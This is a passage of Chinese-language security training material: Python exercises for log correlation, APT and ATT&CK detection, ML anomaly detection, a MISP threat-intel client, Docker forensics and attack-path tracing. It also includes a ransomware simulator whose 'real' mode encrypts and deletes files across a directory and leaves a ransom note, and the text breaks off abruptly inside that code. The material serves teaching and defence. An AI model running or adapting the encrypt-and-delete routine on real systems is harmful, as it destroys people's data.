            ip_events = df[df['source_ip'] == ip].sort_values('timestamp')
            
            # 统计失败登录
            failures = ip_events[ip_events['type'] == 'auth_failure']
            successes = ip_events[ip_events['type'] == 'auth_success']
            
            if len(failures) > 5:
                pattern = {
                    'ip': ip,
                    'failure_count': len(failures),
                    'first_fail': failures.iloc[0]['timestamp'],
                    'last_fail': failures.iloc[-1]['timestamp'],
                    'duration': (failures.iloc[-1]['timestamp'] - failures.iloc[0]['timestamp']).total_seconds() / 60
                }
                
                # 检查是否有成功登录
                if len(successes) > 0:
                    pattern['success_time'] = successes.iloc[0]['timestamp']
                    pattern['attack_success'] = True
                    print(f"  [!] 爆破成功: {ip} - {len(failures)}次失败后成功")
                else:
                    pattern['attack_success'] = False
                    print(f"  [*] 爆破尝试: {ip} - {len(failures)}次失败")
                
                self.attack_patterns.append(pattern)
        
        # 3. 检测Web扫描
        print("\n[3] Web扫描检测")
        web_events = df[df['type'] == 'web_access']
        
        for ip in ip_stats.index[:20]:
            ip_web = web_events[web_events['source_ip'] == ip]
            if len(ip_web) > 50:  # 大量请求
                unique_paths = ip_web['path'].nunique()
                error_rate = len(ip_web[ip_web['status'] >= 400]) / len(ip_web)
                
                if error_rate > 0.3 or unique_paths > 20:
                    print(f"  [!] Web扫描: {ip} - {len(ip_web)}请求, {unique_paths}路径, 错误率{error_rate:.1%}")
        
        # 4. 时间轴关联 - 查找攻击链
        print("\n[4] 攻击链分析")
        for ip in [p['ip'] for p in self.attack_patterns if p.get('attack_success')]:
            ip_events = df[df['source_ip'] == ip].sort_values('timestamp')
            
            print(f"\n  攻击者: {ip}")
            for _, event in ip_events.iterrows():
                if event['type'] == 'auth_failure':
                    print(f"    {event['timestamp']} [失败登录]")
                elif event['type'] == 'auth_success':
                    print(f"    {event['timestamp']} [成功登录] *")
                elif event['type'] == 'web_access':
                    if event['status'] >= 400:
                        print(f"    {event['timestamp']} [Web访问] {event['method']} {event['path']} -> {event['status']}")
        
        # 5. 生成关联规则
        self.generate_rules()
        
        return self.attack_patterns
    
    def generate_rules(self):
        """
        生成检测规则
        """
        print("\n[5] 生成检测规则")
        
        rules = []
        
        for pattern in self.attack_patterns:
            if pattern.get('attack_success'):
                rule = f"""
# 检测规则: 针对 {pattern['ip']} 的爆破成功
alert any any -> any any (
    msg: "SSH爆破成功 - {pattern['ip']}";
    flow: established;
    content:"{pattern['ip']}";
    sid:1000001;
    rev:1;
)
"""
                rules.append(rule)
        
        if rules:
            with open('generated_rules.rules', 'w') as f:
                f.write('\n'.join(rules))
            print(f"[+] 已生成 {len(rules)} 条规则: generated_rules.rules")
    
    def generate_report(self):
        """
        生成HTML报告
        """
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>日志关联分析报告</title>
    <style>
        body {{ font-family: Arial; margin: 20px; }}
        h1 {{ color: #333; }}
        .summary {{ background: #f0f0f0; padding: 10px; border-radius: 5px; }}
        .critical {{ color: red; }}
        .warning {{ color: orange; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #4CAF50; color: white; }}
    </style>
</head>
<body>
    <h1>日志关联分析报告</h1>
    <div class="summary">
        <p>分析时间: {datetime.now()}</p>
        <p>日志目录: {self.log_dir}</p>
        <p>总事件数: {len(self.events)}</p>
        <p>攻击模式: {len(self.attack_patterns)}</p>
    </div>
    
    <h2>攻击模式</h2>
    <table>
        <tr>
            <th>IP地址</th>
            <th>失败次数</th>
            <th>成功登录</th>
            <th>持续时间(分钟)</th>
        </tr>
"""
        for pattern in self.attack_patterns:
            html += f"""
        <tr>
            <td>{pattern['ip']}</td>
            <td>{pattern['failure_count']}</td>
            <td class="{'critical' if pattern.get('attack_success') else ''}">{pattern.get('attack_success', False)}</td>
            <td>{pattern.get('duration', 0):.1f}</td>
        </tr>
"""
        
        html += """
    </table>
</body>
</html>
"""
        
        with open('log_analysis_report.html', 'w') as f:
            f.write(html)
        print("[+] HTML报告已生成: log_analysis_report.html")

def main():
    """主函数"""
    parser = argparse.ArgumentParser(description='日志关联分析器')
    parser.add_argument('--log-dir', default='./logs', help='日志目录')
    parser.add_argument('--window', type=int, default=5, help='时间窗口（分钟）')
    args = parser.parse_args()
    
    # 创建分析器
    correlator = LogCorrelator(log_dir=args.log_dir, time_window=args.window)
    
    # 解析各种日志
    correlator.parse_apache()
    correlator.parse_auth()
    correlator.parse_firewall()
    
    # 执行关联分析
    correlator.correlate()
    
    # 生成报告
    correlator.generate_report()

if __name__ == '__main__':
    main()
演练任务：
准备测试日志文件（可手动创建或下载示例）
运行分析器：python log_correlator.py --log-dir ./test_logs
分析输出的HTML报告
尝试添加新的日志解析器（如Windows事件日志）
勒索软件工作原理：
文件加密：对称加密（快） + 非对称加密（安全）
密钥管理：生成会话密钥，用公钥加密
赎金提示：留下README文件
应急响应流程：
隔离主机，防止扩散
保存加密文件副本
分析加密方式
尝试解密（如果有漏洞）
从备份恢复
常见加密算法：
AES (对称)
RSA (非对称)
XOR (简单勒索软件)
勒索软件模拟与解密

#!/usr/bin/env python3
"""
勒索软件模拟与解密工具 - 完整版
警告：仅在隔离测试环境中运行！
"""

import os
import sys
import argparse
import json
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
import hashlib

# ========== 第一部分：勒索软件模拟 ==========

class RansomwareSimulator:
    """
    勒索软件模拟器（教学用）
    演示文件加密过程和密钥管理
    """
    
    def __init__(self, target_dir='./test_files', mode='simulate'):
        """
        初始化
        :param target_dir: 目标目录
        :param mode: simulate(模拟加密) / real(真实加密)
        """
        self.target_dir = os.path.abspath(target_dir)
        self.mode = mode
        self.key = None
        self.encrypted_files = []
        self.ransom_note = """
        ⚠️ 您的文件已被加密！ ⚠️
        
        所有重要文档、图片、数据库已被AES-256加密。
        
        要恢复文件，请：
        1. 发送 0.1 BTC 到钱包: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
        2. 将您的唯一ID发送到: attacker@example.com
        3. 您将收到解密工具和密钥
        
        您的唯一ID: {victim_id}
        
        不要尝试自行解密，否则文件将永久损坏！
        """
    
    def generate_key(self):
        """生成加密密钥"""
        if self.mode == 'simulate':
            # 模拟模式：使用固定密钥（便于教学）
            self.key = b'simulate_key_1234567890123456'
        else:
            # 真实模式：生成随机密钥
            self.key = Fernet.generate_key()
        
        # 保存密钥（用于演示）
        with open('attackers_key.txt', 'w') as f:
            f.write(self.key.decode() if isinstance(self.key, bytes) else self.key)
        
        return self.key
    
    def setup_test_files(self):
        """创建测试文件"""
        if not os.path.exists(self.target_dir):
            os.makedirs(self.target_dir)
            
            # 创建各种测试文件
            test_files = {
                'document.txt': '这是重要文档内容。\n包含敏感信息。\n密码: admin123',
                'data.csv': 'id,name,value\n1,user1,100\n2,user2,200\n3,user3,300',
                'config.json': '{"database": "localhost", "username": "admin", "password": "secret"}',
                'backup.zip': b'PK\x03\x04\x14\x00\x00\x00\x08\x00' + b'FAKEZIP'*100,
                'image.jpg': b'\xFF\xD8\xFF\xE0' + b'FAKEJPG'*100
            }
            
            for fname, content in test_files.items():
                fpath = os.path.join(self.target_dir, fname)
                if isinstance(content, str):
                    with open(fpath, 'w') as f:
                        f.write(content)
                else:
                    with open(fpath, 'wb') as f:
                        f.write(content)
            
            # 创建子目录
            os.makedirs(os.path.join(self.target_dir, 'subdir'))
            with open(os.path.join(self.target_dir, 'subdir', 'notes.txt'), 'w') as f:
                f.write('子目录中的文件')
        
        print(f"[+] 测试文件已创建: {self.target_dir}")
    
    def encrypt_files(self):
        """加密文件"""
        print(f"\n[*] 开始{'模拟' if self.mode=='simulate' else '真实'}加密...")
        
        # 生成密钥
        key = self.generate_key()
        if isinstance(key, bytes):
            cipher = Fernet(key)
        
        encrypted_count = 0
        skipped_count = 0
        
        # 遍历所有文件
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                filepath = os.path.join(root, file)
                
                # 跳过已加密文件和README
                if file.endswith('.encrypted') or file == 'README.txt':
                    skipped_count += 1
                    continue
                
                try:
                    # 读取文件
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    
                    if self.mode == 'simulate':
                        # 模拟模式：只改后缀，不改内容
                        encrypted_data = data
                    else:
                        # 真实模式：加密内容
                        encrypted_data = cipher.encrypt(data)
                    
                    # 保存加密文件
                    encrypted_path = filepath + '.encrypted'
                    with open(encrypted_path, 'wb') as f:
                        f.write(encrypted_data)
                    
                    # 删除原文件
                    os.remove(filepath)
                    
                    self.encrypted_files.append({
                        'original': filepath,
                        'encrypted': encrypted_path,
                        'size': len(data)
                    })
                    
                    encrypted_count += 1
                    print(f"    [+] 加密: {os.path.basename(filepath)}")
                    
                except Exception as e:
                    print(f"    [-] 失败 {filepath}: {e}")
        
        # 留下勒索信息
        victim_id = hashlib.md5(self.target_dir.encode()).hexdigest()[:8]
        ransom_content = self.ransom_note.format(victim_id=victim_id)
        
        with open(os.path.join(self.target_dir, 'README.txt'), 'w') as f:
            f.write(ransom_content)
        
        print(f"\n[+] 加密完成!")
        print

第三课：
高级威胁狩猎与SOAR编排
掌握APT攻击检测与溯源技术
实现基于机器学习的异常检测
构建完整的SOAR自动化平台
学习威胁情报集成与消费
掌握容器环境应急响应
实现自动化溯源与报告生成
建立应急响应指标体系
练习1：APT检测与溯源 - ATT&CK框架集成
场景：企业网络中出现异常DNS请求，怀疑是APT攻击的C2通信，需要根据ATT&CK战术阶段进行检测和溯源。
代码功能：解析网络流量和日志，映射到MITRE ATT&CK技术，重建攻击链

#!/usr/bin/env python3
"""
练习1：APT检测与溯源系统
功能：将检测到的告警映射到ATT&CK战术，重建攻击链
"""

import json
import requests
from datetime import datetime, timedelta
import pandas as pd

class APTDetector:
    def __init__(self, attack_data='attack.json'):
        self.attack_matrix = self.load_attack_data(attack_data)
        self.alerts = []
        self.attack_chain = {}
    
    def load_attack_data(self, attack_file):
        """加载ATT&CK数据（本地或从网络获取）"""
        # 可以从 https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json 获取
        try:
            with open(attack_file, 'r') as f:
                data = json.load(f)
                return data
        except:
            # 简化版ATT&CK映射
            return {
                "TA0001": {"name": "Initial Access", "techniques": ["T1566", "T1190"]},
                "TA0002": {"name": "Execution", "techniques": ["T1059", "T1204"]},
                "TA0003": {"name": "Persistence", "techniques": ["T1547", "T1505"]},
                "TA0004": {"name": "Privilege Escalation", "techniques": ["T1068", "T1548"]},
                "TA0005": {"name": "Defense Evasion", "techniques": ["T1027", "T1070"]},
                "TA0006": {"name": "Credential Access", "techniques": ["T1003", "T1555"]},
                "TA0007": {"name": "Discovery", "techniques": ["T1087", "T1082"]},
                "TA0008": {"name": "Lateral Movement", "techniques": ["T1021", "T1080"]},
                "TA0009": {"name": "Collection", "techniques": ["T1005", "T1074"]},
                "TA0010": {"name": "Command and Control", "techniques": ["T1071", "T1573"]},
                "TA0011": {"name": "Exfiltration", "techniques": ["T1048", "T1567"]},
                "TA0040": {"name": "Impact", "techniques": ["T1486", "T1499"]}
            }
    
    def add_alert(self, alert):
        """添加告警，包含ATT&CK技术ID"""
        alert['timestamp'] = datetime.now()
        self.alerts.append(alert)
        
        # 更新攻击链
        technique = alert.get('technique_id')
        for tactic_id, tactic in self.attack_matrix.items():
            if technique in tactic['techniques']:
                if tactic_id not in self.attack_chain:
                    self.attack_chain[tactic_id] = []
                self.attack_chain[tactic_id].append({
                    'time': alert['timestamp'],
                    'technique': technique,
                    'description': alert.get('description', ''),
                    'source': alert.get('source', '')
                })
                break
    
    def detect_c2_patterns(self, flow_logs):
        """检测C2通信模式：定期心跳、特定端口等"""
        suspicious = []
        
        # 按源IP分组
        df = pd.DataFrame(flow_logs)
        if df.empty:
            return suspicious
        
        for ip in df['src_ip'].unique():
            ip_flows = df[df['src_ip'] == ip]
            
            # 检测周期性的小流量（心跳）
            if len(ip_flows) > 10:
                intervals = ip_flows['timestamp'].diff().dt.total_seconds()
                if intervals.std() < 5 and intervals.mean() < 60:
                    suspicious.append({
                        'ip': ip,
                        'pattern': 'periodic_heartbeat',
                        'confidence': 'high',
                        'technique_id': 'T1071'
                    })
            
            # 检测常见C2端口
            c2_ports = [4444, 8080, 8443, 53, 123]
            if ip_flows['dst_port'].isin(c2_ports).any():
                suspicious.append({
                    'ip': ip,
                    'pattern': 'c2_port',
                    'confidence': 'medium',
                    'technique_id': 'T1573'
                })
        
        return suspicious
    
    def reconstruct_attack_chain(self):
        """按时间排序，重建攻击链"""
        chain = []
        for tactic_id, events in sorted(self.attack_chain.items()):
            tactic_name = self.attack_matrix[tactic_id]['name']
            for event in sorted(events, key=lambda x: x['time']):
                chain.append({
                    'tactic_id': tactic_id,
                    'tactic_name': tactic_name,
                    'technique': event['technique'],
                    'time': event['time'],
                    'description': event['description']
                })
        return chain
    
    def generate_report(self):
        """生成APT检测报告"""
        chain = self.reconstruct_attack_chain()
        
        print("="*60)
        print("APT攻击链检测报告")
        print("="*60)
        print(f"检测时间: {datetime.now()}")
        print(f"总告警数: {len(self.alerts)}")
        print(f"覆盖战术: {len(self.attack_chain)}/{len(self.attack_matrix)}")
        
        print("\n攻击链时间线:")
        for step in chain:
            print(f"\n{step['time']} [{step['tactic_name']}]")
            print(f"  技术: {step['technique']}")
            print(f"  描述: {step['description']}")
        
        # 检测缺失的战术阶段（可能未检测到的攻击步骤）
        tactics_detected = set(self.attack_chain.keys())
        all_tactics = set(self.attack_matrix.keys())
        missing = all_tactics - tactics_detected
        if missing:
            print(f"\n[!] 可能遗漏的战术阶段:")
            for tactic in missing:
                print(f"  - {self.attack_matrix[tactic]['name']}")

if __name__ == '__main__':
    # 模拟数据
    detector = APTDetector()
    
    # 模拟告警
    alerts = [
        {'technique_id': 'T1566', 'description': '钓鱼邮件附件', 'source': 'email'},
        {'technique_id': 'T1059', 'description': 'PowerShell执行', 'source': 'sysmon'},
        {'technique_id': 'T1547', 'description': '注册表Run键修改', 'source': 'sysmon'},
        {'technique_id': 'T1003', 'description': 'LSASS转储', 'source': 'sysmon'},
        {'technique_id': 'T1082', 'description': '系统信息收集', 'source': 'network'},
        {'technique_id': 'T1071', 'description': 'DNS隧道', 'source': 'network'},
    ]
    
    for alert in alerts:
        detector.add_alert(alert)
    
    detector.generate_report()
练习2：机器学习异常检测 - Isolation Forest
场景：需要从大量正常日志中自动发现异常行为，建立用户和系统行为基线。
代码功能：使用Isolation Forest算法检测日志中的异常模式。

#!/usr/bin/env python3
"""
练习2：机器学习异常检测器
功能：使用Isolation Forest检测日志中的异常模式
"""

import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import matplotlib.pyplot as plt
from datetime import datetime, timedelta
import random

class MLAnomalyDetector:
    def __init__(self, contamination=0.1):
        self.model = IsolationForest(contamination=contamination, random_state=42)
        self.scaler = StandardScaler()
        self.is_fitted = False
    
    def generate_training_data(self, n_samples=1000):
        """生成训练数据（正常行为）"""
        data = []
        
        for i in range(n_samples):
            hour = i % 24
            day = i // 24 % 7
            
            # 正常模式：工作时间活跃，非工作时间较少
            if 9 <= hour <= 17 and day < 5:  # 工作日工作时间
                base_activity = 50 + random.gauss(0, 10)
            elif day >= 5:  # 周末
                base_activity = 20 + random.gauss(0, 5)
            else:  # 非工作时间
                base_activity = 10 + random.gauss(0, 3)
            
            # 添加一些随机变化
            login_attempts = max(0, int(base_activity * random.uniform(0.8, 1.2)))
            bytes_transferred = int(base_activity * 1000 * random.uniform(0.5, 1.5))
            failed_logins = int(login_attempts * 0.05)  # 5%失败率
            
            data.append({
                'hour': hour,
                'day_of_week': day,
                'login_attempts': login_attempts,
                'failed_logins': failed_logins,
                'bytes_transferred': bytes_transferred,
                'process_count': int(10 + random.gauss(0, 2)),
                'connection_count': int(5 + random.gauss(0, 1))
            })
        
        # 注入一些异常
        for _ in range(50):
            anomaly = random.choice(data)
            anomaly['login_attempts'] *= random.randint(10, 20)
            anomaly['failed_logins'] = anomaly['login_attempts']
        
        return pd.DataFrame(data)
    
    def fit(self, df):
        """训练模型"""
        features = ['hour', 'login_attempts', 'failed_logins', 'bytes_transferred', 
                   'process_count', 'connection_count']
        X = df[features].values
        
        # 标准化
        X_scaled = self.scaler.fit_transform(X)
        
        # 训练
        self.model.fit(X_scaled)
        self.is_fitted = True
        print("[*] 模型训练完成")
    
    def predict(self, df):
        """预测异常"""
        if not self.is_fitted:
            raise ValueError("模型尚未训练")
        
        features = ['hour', 'login_attempts', 'failed_logins', 'bytes_transferred', 
                   'process_count', 'connection_count']
        X = df[features].values
        X_scaled = self.scaler.transform(X)
        
        # -1为异常，1为正常
        predictions = self.model.predict(X_scaled)
        scores = self.model.score_samples(X_scaled)
        
        df_result = df.copy()
        df_result['anomaly'] = predictions
        df_result['anomaly_score'] = scores
        
        return df_result
    
    def detect_live(self, event):
        """实时检测单个事件"""
        df = pd.DataFrame([event])
        result = self.predict(df)
        is_anomaly = result.iloc[0]['anomaly'] == -1
        score = result.iloc[0]['anomaly_score']
        
        return is_anomaly, score

if __name__ == '__main__':
    # 生成数据
    detector = MLAnomalyDetector(contamination=0.1)
    train_df = detector.generate_training_data(2000)
    
    # 训练
    detector.fit(train_df)
    
    # 测试正常事件
    normal_event = {
        'hour': 14,
        'day_of_week': 2,
        'login_attempts': 45,
        'failed_logins': 2,
        'bytes_transferred': 50000,
        'process_count': 12,
        'connection_count': 6
    }
    
    # 测试异常事件
    anomaly_event = {
        'hour': 3,
        'day_of_week': 6,
        'login_attempts': 500,
        'failed_logins': 480,
        'bytes_transferred': 1000000,
        'process_count': 45,
        'connection_count': 30
    }
    
    print("\n正常事件检测:")
    is_anomaly, score = detector.detect_live(normal_event)
    print(f"  异常: {is_anomaly}, 分数: {score:.2f}")
    
    print("\n异常事件检测:")
    is_anomaly, score = detector.detect_live(anomaly_event)
    print(f"  异常: {is_anomaly}, 分数: {score:.2f}")
    
    # 批量预测
    test_df = pd.DataFrame([normal_event, anomaly_event])
    results = detector.predict(test_df)
    print("\n批量预测结果:")
    print(results[['login_attempts', 'failed_logins', 'anomaly', 'anomaly_score']])
练习3：威胁情报集成 - MISP API客户端
场景：需要从MISP（开源威胁情报平台）获取最新IOC，并与内部告警关联。
代码功能：MISP API客户端，获取事件、搜索IOC、与本地日志关联。

#!/usr/bin/env python3
"""
练习3：威胁情报集成
功能：从MISP获取威胁情报，与本地告警关联
"""

import requests
import json
import hashlib
from datetime import datetime, timedelta
import ipaddress

class MISPClient:
    def __init__(self, base_url, api_key, verify_ssl=True):
        self.base_url = base_url.rstrip('/')
        self.api_key = api_key
        self.verify_ssl = verify_ssl
        self.headers = {
            'Authorization': api_key,
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
        self.iocs = []
    
    def get_events(self, days_back=7):
        """获取最近的事件"""
        url = f"{self.base_url}/events/index"
        
        # 计算日期范围
        date_from = (datetime.now() - timedelta(days=days_back)).strftime('%Y-%m-%d')
        
        params = {
            'searchpublished': 1,
            'searchDatefrom': date_from,
            'limit': 100
        }
        
        try:
            response = requests.get(url, headers=self.headers, params=params, 
                                   verify=self.verify_ssl)
            if response.status_code == 200:
                events = response.json()
                print(f"[+] 获取到 {len(events)} 个事件")
                return events
            else:
                print(f"[-] 获取失败: {response.status_code}")
                return []
        except Exception as e:
            print(f"[-] 错误: {e}")
            return []
    
    def get_attributes(self, event_id):
        """获取事件的属性（IOC）"""
        url = f"{self.base_url}/attributes/restSearch"
        
        data = {
            'eventid': event_id,
            'returnFormat': 'json'
        }
        
        try:
            response = requests.post(url, headers=self.headers, json=data,
                                    verify=self.verify_ssl)
            if response.status_code == 200:
                result = response.json()
                attributes = result.get('response', {}).get('Attribute', [])
                return attributes
        except Exception as e:
            print(f"[-] 获取属性失败: {e}")
        return []
    
    def fetch_all_iocs(self, days_back=7):
        """获取所有IOC"""
        self.iocs = []
        events = self.get_events(days_back)
        
        for event in events:
            event_id = event['Event']['id']
            event_info = event['Event']['info']
            attributes = self.get_attributes(event_id)
            
            for attr in attributes:
                if attr.get('type') in ['ip-dst', 'ip-src', 'domain', 'url', 'md5', 'sha1', 'sha256']:
                    ioc = {
                        'event_id': event_id,
                        'event_info': event_info,
                        'type': attr['type'],
                        'value': attr['value'],
                        'category': attr['category'],
                        'timestamp': attr['timestamp']
                    }
                    self.iocs.append(ioc)
        
        print(f"[+] 共获取 {len(self.iocs)} 个IOC")
        return self.iocs
    
    def match_logs(self, logs):
        """将日志与IOC匹配"""
        matches = []
        
        for log in logs:
            for ioc in self.iocs:
                if ioc['type'] in ['ip-dst', 'ip-src']:
                    if log.get('ip') == ioc['value']:
                        matches.append({'log': log, 'ioc': ioc})
                elif ioc['type'] in ['domain', 'url']:
                    if ioc['value'] in log.get('url', ''):
                        matches.append({'log': log, 'ioc': ioc})
                elif ioc['type'] in ['md5', 'sha1', 'sha256']:
                    if log.get('hash') == ioc['value']:
                        matches.append({'log': log, 'ioc': ioc})
        
        return matches
    
    def generate_alert(self, matches):
        """生成关联告警"""
        if not matches:
            return
        
        print("\n" + "="*60)
        print("威胁情报关联告警")
        print("="*60)
        
        for match in matches:
            print(f"\n[!] 命中IOC")
            print(f"  日志: {match['log']}")
            print(f"  IOC类型: {match['ioc']['type']}")
            print(f"  IOC值: {match['ioc']['value']}")
            print(f"  事件: {match['ioc']['event_info']}")
            print(f"  时间: {datetime.fromtimestamp(int(match['ioc']['timestamp']))}")

# 模拟本地日志
def generate_sample_logs():
    return [
        {'ip': '8.8.8.8', 'url': 'https://google.com', 'timestamp': datetime.now()},
        {'ip': '185.130.5.133', 'url': 'http://malware.com/payload.exe', 'hash': '44d88612fea8a8f36de82e1278abb02f'},
        {'ip': '192.168.1.100', 'url': 'https://internal.server', 'timestamp': datetime.now()}
    ]

if __name__ == '__main__':
    # 模拟MISP（实际使用时替换为真实URL和API密钥）
    client = MISPClient(
        base_url='https://misp.example.com',
        api_key='YOUR_API_KEY_HERE'
    )
    
    # 模拟模式（无真实MISP时使用）
    print("[*] 模拟模式：使用本地IOC示例")
    client.iocs = [
        {'type': 'ip-dst', 'value': '185.130.5.133', 'event_info': '恶意C2服务器', 'timestamp': '1700000000'},
        {'type': 'md5', 'value': '44d88612fea8a8f36de82e1278abb02f', 'event_info': '勒索软件样本', 'timestamp': '1700000001'}
    ]
    
    # 获取本地日志
    logs = generate_sample_logs()
    
    # 关联匹配
    matches = client.match_logs(logs)
    client.generate_alert(matches)
练习4：容器安全响应 - Docker取证工具
场景：容器环境发生安全事件，需要快速取证：获取容器镜像、导出日志、检查挂载。
代码功能：Docker取证工具，自动收集容器信息、导出镜像、分析挂载点。

#!/usr/bin/env python3
"""
练习4：容器取证工具
功能：收集Docker容器信息，导出镜像，分析可疑挂载
"""

import docker
import tarfile
import os
import json
from datetime import datetime
import subprocess

class DockerForensics:
    def __init__(self):
        self.client = docker.from_env()
        self.evidence_dir = f"/tmp/forensics_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.evidence_dir, exist_ok=True)
    
    def list_containers(self, all=True):
        """列出所有容器"""
        containers = self.client.containers.list(all=all)
        print(f"[*] 发现 {len(containers)} 个容器")
        
        container_info = []
        for container in containers:
            info = {
                'id': container.id[:12],
                'name': container.name,
                'image': container.image.tags,
                'status': container.status,
                'created': container.attrs['Created'],
                'labels': container.labels
            }
            container_info.append(info)
            
            # 保存详细信息
            with open(f"{self.evidence_dir}/{container.name}_attrs.json", 'w') as f:
                json.dump(container.attrs, f, indent=2)
        
        return container_info
    
    def export_container_fs(self, container_name):
        """导出容器文件系统"""
        container = self.client.containers.get(container_name)
        
        # 使用docker export导出
        output_path = f"{self.evidence_dir}/{container_name}_fs.tar"
        with open(output_path, 'wb') as f:
            for chunk in container.export():
                f.write(chunk)
        
        print(f"[+] 文件系统已导出: {output_path}")
        return output_path
    
    def get_container_logs(self, container_name, lines=1000):
        """获取容器日志"""
        container = self.client.containers.get(container_name)
        logs = container.logs(tail=lines).decode('utf-8', errors='ignore')
        
        log_path = f"{self.evidence_dir}/{container_name}_logs.txt"
        with open(log_path, 'w') as f:
            f.write(logs)
        
        print(f"[+] 日志已保存: {log_path}")
        return logs
    
    def analyze_mounts(self, container_name):
        """分析容器挂载点，检查敏感路径"""
        container = self.client.containers.get(container_name)
        mounts = container.attrs['Mounts']
        
        suspicious_mounts = []
        sensitive_paths = ['/etc', '/var', '/home', '/root', '/proc', '/sys']
        
        for mount in mounts:
            source = mount.get('Source', '')
            destination = mount.get('Destination', '')
            
            # 检查是否挂载了敏感目录
            for sensitive in sensitive_paths:
                if sensitive in source or sensitive in destination:
                    suspicious_mounts.append({
                        'source': source,
                        'destination': destination,
                        'mode': mount.get('Mode', ''),
                        'reason': f'挂载敏感路径 {sensitive}'
                    })
                    break
        
        return suspicious_mounts
    
    def scan_for_malware(self, container_name):
        """扫描容器中的恶意文件（使用clamav或简单检查）"""
        # 这里用简单模拟
        print(f"[*] 扫描容器 {container_name} 中的恶意文件...")
        
        # 导出并扫描
        fs_path = self.export_container_fs(container_name)
        
        # 解压到临时目录
        extract_path = f"{self.evidence_dir}/{container_name}_extract"
        os.makedirs(extract_path, exist_ok=True)
        
        with tarfile.open(fs_path) as tar:
            tar.extractall(path=extract_path)
        
        # 简单检查常见恶意文件特征
        suspicious = []
        for root, dirs, files in os.walk(extract_path):
            for file in files:
                filepath = os.path.join(root, file)
                if file in ['miner', 'xmrig', 'kdevtmpfsi'] or file.endswith(('.exe', '.bin')):
                    suspicious.append(filepath)
        
        return suspicious
    
    def generate_report(self):
        """生成取证报告"""
        containers = self.list_containers()
        
        report = f"""
Docker取证报告
================
时间: {datetime.now()}
证据目录: {self.evidence_dir}

容器列表:
"""
        
        for c in containers:
            report += f"\n容器: {c['name']} ({c['id']})"
            report += f"\n  状态: {c['status']}"
            report += f"\n  镜像: {c['image']}"
            
            # 分析挂载
            mounts = self.analyze_mounts(c['name'])
            if mounts:
                report += f"\n  [!] 可疑挂载:"
                for m in mounts:
                    report += f"\n    {m['source']} -> {m['destination']} ({m['reason']})"
            
            # 获取日志
            self.get_container_logs(c['name'])
            
            report += f"\n"
        
        report_path = f"{self.evidence_dir}/report.txt"
        with open(report_path, 'w') as f:
            f.write(report)
        
        print(report)
        return report

if __name__ == '__main__':
    forensics = DockerForensics()
    
    # 模拟模式（如果没有Docker环境）
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == '--simulate':
        print("[模拟模式] 使用示例数据")
        forensics.evidence_dir = './forensics_output'
        os.makedirs(forensics.evidence_dir, exist_ok=True)
        
        # 创建模拟报告
        with open(f"{forensics.evidence_dir}/sample_container_attrs.json", 'w') as f:
            json.dump({"Name": "test_container", "Mounts": []}, f)
        
        with open(f"{forensics.evidence_dir}/test_container_logs.txt", 'w') as f:
            f.write("模拟日志内容\n")
        
        print("[+] 模拟取证完成，输出目录:", forensics.evidence_dir)
    else:
        # 真实Docker环境
        forensics.generate_report()
练习5：自动化溯源 - 攻击路径重建
场景：多个告警关联后，需要重建攻击者在网络中的移动路径，找出受影响的主机和账户。
代码功能：使用图数据库（NetworkX）构建网络拓扑，根据告警重建攻击路径。

#!/usr/bin/env python3
"""
练习5：攻击路径重建
功能：基于告警和网络拓扑，重建攻击者移动路径
"""

import networkx as nx
import matplotlib.pyplot as plt
from datetime import datetime, timedelta
import random

class AttackTracer:
    def __init__(self):
        self.graph = nx.DiGraph()
        self.alerts = []
        self.attack_paths = []
    
    def build_topology(self):
        """构建网络拓扑"""
        # 添加主机节点
        hosts = [
            ('internet', {'type': 'external'}),
            ('firewall', {'type': 'network'}),
            ('web_server', {'type': 'server', 'ip': '192.168.1.10'}),
            ('db_server', {'type': 'server', 'ip': '192.168.1.20'}),
            ('workstation1', {'type': 'workstation', 'ip': '192.168.1.100', 'user': 'alice'}),
            ('workstation2', {'type': 'workstation', 'ip': '192.168.1.101', 'user': 'bob'}),
            ('domain_controller', {'type': 'server', 'ip': '192.168.1.5'}),
        ]
        
        for host, attrs in hosts:
            self.graph.add_node(host, **attrs)
        
        # 添加网络连接
        connections = [
            ('internet', 'firewall'),
            ('firewall', 'web_server'),
            ('web_server', 'db_server'),
            ('web_server', 'workstation1'),
            ('workstation1', 'workstation2'),
            ('workstation2', 'domain_controller'),
            ('domain_controller', 'db_server'),
        ]
        
        for src, dst in connections:
            self.graph.add_edge(src, dst)
        
        return self.graph
    
    def add_alert(self, alert):
        """添加告警"""
        alert['timestamp'] = datetime.now() - timedelta(minutes=random.randint(0, 60))
        self.alerts.append(alert)
        self.alerts.sort(key=lambda x: x['timestamp'])
    
    def trace_attack(self):
        """追踪攻击路径"""
        if not self.alerts:
            return []
        
        # 按时间排序的告警
        sorted_alerts = sorted(self.alerts, key=lambda x: x['timestamp'])
        
        # 重建路径
        path = []
        current_host = sorted_alerts[0].get('src_host')
        
        for alert in sorted_alerts:
            src = alert.get('src_host')
            dst = alert.get('dst_host')
            
            if src != current_host and dst != current_host:
                # 可能遗漏了跳板
                path.append({'type': 'gap', 'from': current_host, 'to': src})
                current_host = src
            
            if src == current_host:
                path.append({
                    'timestamp': alert['timestamp'],
                    'from': src,
                    'to': dst,
                    'technique': alert.get('technique'),
                    'description': alert.get('description')
                })
                current_host = dst
        
        self.attack_paths.append({
            'start_time': sorted_alerts[0]['timestamp'],
            'end_time': sorted_alerts[-1]['timestamp'],
            'path': path,
            'alert_count': len(sorted_alerts)
        })
        
        return path
    
    def find_compromised_hosts(self):
        """找出受感染主机"""
        compromised = set()
        for alert in self.alerts:
            compromised.add(alert.get('src_host'))
            compromised.add(alert.get('dst_host'))
        return compromised - {None}
    
    def suggest_remediation(self):
